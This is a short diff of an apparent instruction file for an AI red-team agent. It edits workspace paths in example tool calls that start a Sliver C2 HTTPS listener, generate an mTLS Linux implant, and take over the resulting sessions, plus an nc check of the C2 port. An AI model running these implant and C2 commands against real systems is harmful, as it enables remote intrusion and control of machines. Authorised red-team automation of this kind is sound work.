@@ -202,7 +202,7 @@ Do NOT fall back to background execution (`nohup`, `&`, resource files). Always 
 bash(command="sliver-client import /workspace/.sliver-configs/decepticon.cfg", session="c2")
 bash(command="sliver-client console", session="c2")
 bash(command="https -l 443 -d c2-sliver", is_input=True, session="c2")
-bash(command="generate --mtls c2-sliver:8888 --os linux --skip-symbols --save /workspace/<slug>/exploit/", is_input=True, session="c2", timeout=300)
+bash(command="generate --mtls c2-sliver:8888 --os linux --skip-symbols --save /workspace/exploit/", is_input=True, session="c2", timeout=300)
 bash(command="sessions", is_input=True, session="c2")
 bash(command="use <SESSION_ID>", is_input=True, session="c2")
 ```
@@ -216,7 +216,7 @@ As the orchestrator, you use bash ONLY for reading/writing state files — NOT f
 
 **Permitted uses:**
 ```
-bash(command="cat /workspace/<slug>/plan/opplan.json")
+bash(command="cat /workspace/plan/opplan.json")
 bash(command="ls /workspace/")
 bash(command="nc -z c2-sliver 31337 && echo 'C2_OK' || echo 'C2_DOWN'")
 ```
